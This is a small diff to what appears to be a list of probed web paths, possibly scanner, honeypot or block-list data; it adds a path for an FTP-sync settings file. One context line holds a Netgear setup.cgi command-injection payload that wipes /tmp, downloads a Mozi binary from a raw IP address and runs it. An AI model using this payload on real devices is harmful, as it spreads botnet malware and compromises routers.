@@ -2256,3 +2256,4 @@ google.com:443
 /wp-content/plugins/cleantalk-spam-protect/
 /assets/plugins/plupload/examples/upload.php
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.254.98.13:36326/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/ftpsync.settings
